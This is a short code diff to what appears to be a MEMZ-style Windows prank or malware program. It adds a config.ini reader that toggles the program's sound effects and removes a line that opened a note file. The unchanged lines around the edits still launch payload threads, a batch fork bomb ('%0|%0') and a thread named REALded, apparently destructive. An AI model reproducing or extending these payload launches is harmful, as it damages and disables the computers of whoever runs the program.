@@ -27,6 +27,10 @@ SOFTWARE.
 #include <windows.h>
 #include <windowsx.h>
 
+#include "modules/INIReader.h" // reads the .INI file to check some settings
+//#include <iostream>
+#include <sstream>
+
 #include <Mmsystem.h>
 #include <mciapi.h>
 //these two headers are already included in the <Windows.h> header
@@ -38,6 +42,17 @@ SOFTWARE.
 #pragma comment(lib, "winmm.lib")
 
 #pragma comment( user, "Compiled on " __DATE__ " at " __TIME__ )
+
+std::string sections(INIReader &reader) {
+  std::stringstream ss;
+  std::set<std::string> sections = reader.Sections();
+  for (std::set<std::string>::iterator it = sections.begin();
+       it != sections.end(); ++it)
+    ss << *it << ",";
+  return ss.str();
+}
+
+INIReader reader("config.ini");
 
 DWORD random() {
 	DWORD number = __rdtsc();
@@ -1917,7 +1932,11 @@ void startPayloads() {
 
 	HANDLE thread;
 	DWORD ID;
-    mciSendString(L"play ./res/start.mp3", NULL, 0, NULL);
+
+    if (reader.GetBoolean("main", "undertalesfx", true)) { // if is true, default is, also true
+        mciSendString(L"play ./res/start.mp3", NULL, 0, NULL);
+    }
+
     Sleep(random() % 3000 + 2400);
 	thread = CreateThread(0, 0, FakeError, 0, 0, &ID);
 
@@ -1925,8 +1944,6 @@ void startPayloads() {
     thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)msgXD, 0, 0, &ID);
     Sleep(random() % 500 + 340);
     thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ded, 0, 0, &ID);
-    // thanks tabnine
-    system("./res/note.txt");
 
 	Sleep(random() % 5000 + 3400);
 	HANDLE dark = CreateThread(0, 0, Dark, 0, 0, &ID);
@@ -2089,7 +2106,10 @@ void startPayloads() {
     RipBozo();
     system("./LOL/LOL.html"); // HTML/JS code :000000
 
-    mciSendString(L"play ./res/finale.mp3", NULL, 0, NULL);
+    if (reader.GetBoolean("main", "undertalesfx", true)) { // if is true, default is, also true
+        mciSendString(L"play ./res/finale.mp3", NULL, 0, NULL);
+    }
+    
     system("./res/FORK.bat"); // (forkbomb, %0|%0)
     thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)REALded, 0, 0, &ID);
     
